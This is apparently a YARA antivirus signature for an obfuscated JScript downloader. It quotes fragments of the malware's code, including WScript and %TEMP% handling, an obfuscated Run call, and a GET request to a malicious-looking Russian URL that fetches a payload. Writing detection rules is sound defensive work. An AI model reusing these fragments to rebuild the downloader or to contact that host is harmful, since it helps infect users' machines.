rule sig_20160428_29e8db6b1dd404565f7d4832b9148feb {
  meta:
    description = "datamaliciousorder - file 20160428_29e8db6b1dd404565f7d4832b9148feb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1dd372d1a600bf333fed17694c8af3291746a1d2350bd4e495478d00d4643234"

  strings:
    $s1  = "function DonEfvYxkKzqNsmZnmCnk() {return PueLtbZzwVeoJalMdcHlg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function AdnXelUorEscGmcFsnPtb(MfqGeiQvsWgqWtqNqzSjd){PueLtbZzwVeoJalMdcHlg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function AdnXelUorEscGmcFsnPtb(MfqGeiQvsWgqWtqNqzSjd){PueLtbZzwVeoJalMdcHlg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function FufCqwKlkIqcKdpBhrLdt(GwvOeeBcdQgfExaTziPtu, DvjCxiSmpHyqHiiHpbUsr){VohUbxTleXszLgaEjaZbk = VohUbxTleXszLgaEjaZbk * 1; " ascii
    $s5  = "return GwvOeeBcdQgfExaTziPtu - DvjCxiSmpHyqHiiHpbUsr;};" fullword ascii
    $s6  = "var PueLtbZzwVeoJalMdcHlg = function OiaArhNonJwxTiuGioTjq() {return NvaXuhBuiErhYdmKjcKbn[NubPzhUejZjfIxdLrjMzn](\"WScript\"+\"" ascii
    $s7  = "var NvaXuhBuiErhYdmKjcKbn = this[\"WScript\"];" fullword ascii
    $s8  = "var PueLtbZzwVeoJalMdcHlg = function OiaArhNonJwxTiuGioTjq() {return NvaXuhBuiErhYdmKjcKbn[NubPzhUejZjfIxdLrjMzn](\"WScript\"+\"" ascii
    $s9  = "function DonEfvYxkKzqNsmZnmCnk() {return PueLtbZzwVeoJalMdcHlg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function QhlSelCwaIqoWrgHweUqd(){return OpiSrtVtoUydMtcDqrHzf + \"\";};" fullword ascii
    $s11 = "function FufCqwKlkIqcKdpBhrLdt(GwvOeeBcdQgfExaTziPtu, DvjCxiSmpHyqHiiHpbUsr){VohUbxTleXszLgaEjaZbk = VohUbxTleXszLgaEjaZbk * 1; " ascii
    $s12 = "if (CypBnuVkdMioMbqUsdMso[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function DhcNdzUjfYopWxyYtdWhw() {return ((OluYtyGkkSghVupTsdZsf == true) && (OluYtyGkkSghVupTsdZsf == BtvExfPimSbuZelNhhGji)) ?" ascii
    $s14 = "CypBnuVkdMioMbqUsdMso[YdwIgeXocAwfFsaDjuGnk](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s15 = "function DhcNdzUjfYopWxyYtdWhw() {return ((OluYtyGkkSghVupTsdZsf == true) && (OluYtyGkkSghVupTsdZsf == BtvExfPimSbuZelNhhGji)) ?" ascii
    $s16 = "OluYtyGkkSghVupTsdZsf = true; " fullword ascii
    $s17 = "function LdyAfwCvfNnjXehKpfKgl()" fullword ascii
    $s18 = "return FufCqwKlkIqcKdpBhrLdt(1 == 1 ? VxkAccIprZufQesHruSth : 0, 1 == 1 ? GhiIjrFqbXckDuxGyqZue : 0);" fullword ascii
    $s19 = "var BtvExfPimSbuZelNhhGji = false;" fullword ascii
    $s20 = "function QjeMwkPeiBpeWdcUpjJsa(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}